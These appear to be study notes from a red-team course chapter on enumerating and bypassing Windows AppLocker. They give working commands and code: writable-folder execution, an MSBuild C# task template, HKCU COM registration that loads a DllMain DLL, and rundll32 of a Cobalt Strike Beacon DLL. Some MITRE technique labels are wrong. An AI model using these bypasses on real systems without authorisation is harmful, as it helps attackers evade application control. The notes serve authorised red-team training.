# CRTO — AppLocker: Introduction, Enumeration & Bypasses

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Section:** AppLocker (Chapter 21)
**Objective:** Understand AppLocker policy structure, enumerate policies from registry and GPO, and apply multiple bypass techniques

> **v3rnsamos Discord note:** "The AppLocker section is the one you definitely need to master" — this is high-value on the exam because AppLocker is a **gatekeeper** on protected machines. If you can't bypass it, you can't execute payloads and can't progress.

---

## What Is AppLocker?

AppLocker is a Windows application control technology that prevents users from running unapproved executables, scripts, installers, and packages. Policies are defined by rule collections, each containing:

- **Permission:** Allow or Deny + the user/group it applies to
- **Condition:** Publisher (signed cert), Path (file/folder), or File Hash

Policies are deployed via GPO or Intune.

### Default AppLocker Rules

**Executable Rules** (`.exe`, `.com`):
```
Allow | Everyone           | Path | %PROGRAMFILES%\*
Allow | Everyone           | Path | %WINDIR%\*
Allow | BUILTIN\Administrators | Path | *
```

**Windows Installer Rules** (`.msi`, `.msp`, `.mst`):
```
Allow | Everyone           | Publisher | *
Allow | Everyone           | Path      | %WINDIR%\Installer\*
Allow | BUILTIN\Administrators | Path  | *.*
```

**Script Rules** (`.ps1`, `.bat`, `.cmd`, `.vbs`, `.js`):
```
Allow | Everyone           | Path | %PROGRAMFILES%\*
Allow | Everyone           | Path | %WINDIR%\*
Allow | BUILTIN\Administrators | Path | *
```

**Packaged App Rules** (`.appx`):
```
Allow | Everyone           | Publisher | *
```

> **Key insight:** Administrators can run anything (`*`). Standard users are limited to `%PROGRAMFILES%\*` and `%WINDIR%\*`. All bypasses target writable locations within those allowed paths.

Blocked execution looks like the screenshot — "This app has been blocked by your system administrator."

---

## Phase 1 — Enumeration

Understanding the policy is essential before attempting a bypass — you need to know what's allowed and where writable paths exist.

### Method A — Registry (on a protected machine)

Use when you already have console/Beacon access to the AppLocker-protected machine.

```powershell
# List all rule collections and their enforcement mode
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

# Key values:
# EnforcementMode: 1 = Enforced, 0 = Audit only
# Rule collections: Appx, Dll, Exe, Msi, Script
```

**Parse Exe rules (raw XML):**
```powershell
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
# Returns each rule as an XML string in the Value property
```

**Parse rules cleanly with native cmdlet:**
```powershell
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections
# Returns: PathConditions, Action, UserOrGroupSid, Name for each rule
```

**Registry path reference:**

| Path | Rule Collection |
|---|---|
| `HKLM:\Software\Policies\Microsoft\Windows\SrpV2\Exe` | Executable rules |
| `HKLM:\Software\Policies\Microsoft\Windows\SrpV2\Script` | Script rules |
| `HKLM:\Software\Policies\Microsoft\Windows\SrpV2\Msi` | Installer rules |
| `HKLM:\Software\Policies\Microsoft\Windows\SrpV2\Appx` | Packaged app rules |
| `HKLM:\Software\Policies\Microsoft\Windows\SrpV2\Dll` | DLL rules (rarely enabled) |

---

### Method B — GPO / SysVol (from an unprotected machine)

Use when you have a Beacon on an unprotected machine and need to analyse the policy before moving laterally to a protected one.

**Step 1 — Find the AppLocker GPO:**
```bash
ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
# Look for a GPO named "AppLocker" or similar
# Note the gPCFileSysPath: \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-...}
```

**Step 2 — List the GPO's Machine directory:**
```bash
ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine
# Look for Registry.pol
```

**Step 3 — Download Registry.pol:**
```bash
download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-...}\Machine\Registry.pol
```

**Step 4 — Parse on attacker desktop:**
```powershell
Parse-PolFile -Path .\Desktop\Registry.pol
# Returns KeyName, ValueName, ValueData (XML rule strings) for each AppLocker rule
# KeyName format: Software\Policies\Microsoft\Windows\SrpV2\<collection>\<GUID>
```

> `Parse-PolFile` is from the `GpRegistryPolicy` PowerShell module. The output is the same XML as the registry method — parse `FilePathCondition Path=` attributes to identify allowed directories.

---

## Phase 2 — Bypasses

Once you understand the policy, find a bypass. The goal: **execute a payload from a path that AppLocker allows.**

---

### Bypass 1 — Writable Directories in %WINDIR%

`%WINDIR%\*` is allowed for everyone by default. Several directories within `%WINDIR%` are writable by standard users:

```
C:\Windows\Tasks                              ← most reliable
C:\Windows\Temp
C:\Windows\Tracing
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
```

**The bypass — copy and execute from a writable allowed path:**

As shown in the screenshot:
```cmd
# test.exe on Desktop → BLOCKED
test.exe
# "This program is blocked by group policy"

# Copy to C:\Windows\Tasks → ALLOWED
copy test.exe C:\Windows\Tasks
C:\Windows\Tasks\test.exe
# Executes successfully — "AppLocker Bypass" dialog appears
```

**In Beacon:**
```bash
cd C:\Windows\Tasks
upload C:\Payloads\http_x64.exe
shell C:\Windows\Tasks\http_x64.exe
```

**Find additional writable paths manually:**
```powershell
# Check ACLs on directories under %WINDIR%
icacls C:\Windows\* | findstr /i "everyone\|BUILTIN\Users\|NT AUTHORITY\Authenticated"

# Or with Get-Acl
Get-ChildItem C:\Windows -Directory | ForEach-Object { 
    $acl = Get-Acl $_.FullName
    $acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|Authenticated" -and $_.FileSystemRights -match "Write|FullControl" }
}
```

---

### Bypass 2 — Path Wildcard Misconfiguration

Custom rules sometimes use overly permissive wildcards. Example vulnerable rule:

```xml
<FilePathRule Action="Allow">
    <Conditions>
        <FilePathCondition Path="*\App-V\*"/>
    </Conditions>
</FilePathRule>
```

`*\App-V\*` — the leading `*` means any path containing `\App-V\` is allowed, not just `%PROGRAMFILES%\App-V\`. Create a directory called `App-V` anywhere and execute from it.

**What to look for when parsing rules:**
- Path conditions that don't start with `%PROGRAMFILES%` or `%WINDIR%`
- Wildcards in the middle of paths (`*\foldername\*`)
- Custom application paths that may be user-writable

---

### Bypass 3 — MSBuild (LOLBAS)

`MSBuild.exe` lives in `%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\` — an allowed path. It can execute arbitrary C# code from a `.csproj` file.

**Create `test.csproj`:**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
      <Reference Include="System.Windows.Forms" />      
      <Code Type="Class" Language="cs">
        <![CDATA[
        using Microsoft.Build.Utilities;
        using System.Windows.Forms;
        public class MSBuild : Task
        {
            public override bool Execute()
            {
                // Replace with shellcode execution or other payload
                MessageBox.Show("Hello World", "AppLocker Bypass");
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Execute:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe test.csproj
```

As shown in the screenshot — MSBuild runs from an allowed path, executes arbitrary C# code, bypasses AppLocker entirely.

> For a real Beacon payload, replace the `Execute()` method body with shellcode allocation and execution (same pattern as the SQL CLR stored procedure lab).

---

### Bypass 4 — COM Object via PowerShell CLM

AppLocker enforces **Constrained Language Mode (CLM)** in PowerShell when script rules are active:

```powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage

[System.Console]::WriteLine("Hello World")
# ERROR: Cannot invoke method. Method invocation is supported only on core types.
```

CLM blocks direct .NET API calls — but `New-Object -ComObject` still works. Abuse this to load a custom COM object that executes a DLL:

**Step 1 — Generate a new CLSID:**
```powershell
[System.Guid]::NewGuid()
# e.g. 6136e053-47cb-4fdd-84b1-381bc5f3edb3
```

**Step 2 — Register the COM object in HKCU:**
```powershell
New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
```

**Step 3 — Trigger the COM object:**
```powershell
New-Object -ComObject AppLocker.Bypass
# Loads bypass.dll via DllMain → executes payload
```

As shown in the screenshot — PowerShell in CLM instantiates the COM object, which loads the DLL from the Desktop (or any path), executing the payload.

**bypass.dll source (minimal C++ DLL):**
```cpp
#include <windows.h>

extern "C" __declspec(dllexport) BOOL execute() {
    MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        return execute();
    }
    return TRUE;
}
```

> For a real engagement, replace the DLL with a Beacon DLL payload — the DllMain executes on load, giving you a Beacon inside the PowerShell process.

**Why this works:** HKCU COM registration is the same technique as the Persistence lab (COM hijacking). CLM blocks .NET API calls but not COM instantiation via `New-Object -ComObject`. The DLL is loaded by the PowerShell process — AppLocker's DLL rules are usually **not enabled** (performance concerns, as shown in the screenshot of the disabled DLL rule collection checkbox).

---

### Bypass 5 — rundll32 (DLL Rules Disabled)

AppLocker can enforce DLL rules, but rarely does — the performance impact is significant (shown in the "DLL rules can affect system performance" screenshot). When DLL rules are **not enforced**, arbitrary DLLs can be loaded via `rundll32`.

```cmd
# Call the exported function from a Beacon DLL
rundll32 bypass.dll,execute
```

The Cobalt Strike Beacon DLL payload exports a function called **`StartW`** specifically for this use case:

```cmd
rundll32 C:\Windows\Tasks\http_x64.dll,StartW
```

> The DLL can be placed in any writable `%WINDIR%` subdirectory (e.g. `C:\Windows\Tasks`) since `%WINDIR%\*` is allowed for EXEs. DLL rules being disabled means the DLL itself isn't checked.

---

## AppLocker Bypass Decision Tree

```
1. Read the policy (Registry or Parse-PolFile)
       ↓
2. Is %WINDIR%\* allowed? → Find writable subdirectory → drop EXE there
       ↓ (if EXE blocked or writable path not found)
3. Are DLL rules enabled? → If NO → rundll32 from writable path
       ↓ (if DLL rules enabled)
4. Is MSBuild in an allowed path? → Yes (%WINDIR%) → MSBuild .csproj payload
       ↓ (if script rules block .csproj)
5. Are custom path rules overly permissive? → Find wildcard path → create matching directory
       ↓ (if in PowerShell CLM)
6. COM object via New-Object -ComObject → load DLL into PS process
```

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1562.001 | Impair Defenses: Disable or Modify Tools | Identifying AppLocker policy weaknesses |
| T1059.001 | PowerShell | CLM bypass via COM object |
| T1218.004 | System Binary Proxy Execution: InstallUtil | MSBuild LOLBAS execution |
| T1218.011 | System Binary Proxy Execution: Rundll32 | rundll32 DLL execution |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading | COM object DLL loading |

---

## Key Takeaways

- **Always enumerate the policy first** — you can't find a bypass without knowing what's allowed and what paths are writable
- **Two enumeration methods:** registry (`Get-AppLockerPolicy`) on a protected machine, GPO/`Parse-PolFile` from an unprotected Beacon before lateral movement
- **`C:\Windows\Tasks` is the most reliable writable allowed path** — it's within `%WINDIR%\*` and writable by standard users on most systems
- **DLL rules are almost never enabled** — if you have a DLL payload, `rundll32` is a fast bypass. The CS Beacon DLL exports `StartW` specifically for this
- **MSBuild is a powerful LOLBAS** — arbitrary C# execution from an allowed path, no compilation needed, no AV signature on the `.csproj` file
- **CLM blocks .NET APIs but not COM** — `New-Object -ComObject` is the CLM escape hatch; register in HKCU (no admin required)
- **EnforcementMode: 0 = Audit only** — if you see this in the registry, AppLocker is logging but not blocking. Confirm before assuming you need a bypass.
- Check custom rules for wildcard misconfigurations — any path rule not anchored to `%PROGRAMFILES%` or `%WINDIR%` is potentially exploitable
- Remember *primum non nocere* — don't disable AppLocker entirely. Find a bypass that works within the policy rather than disabling the control.
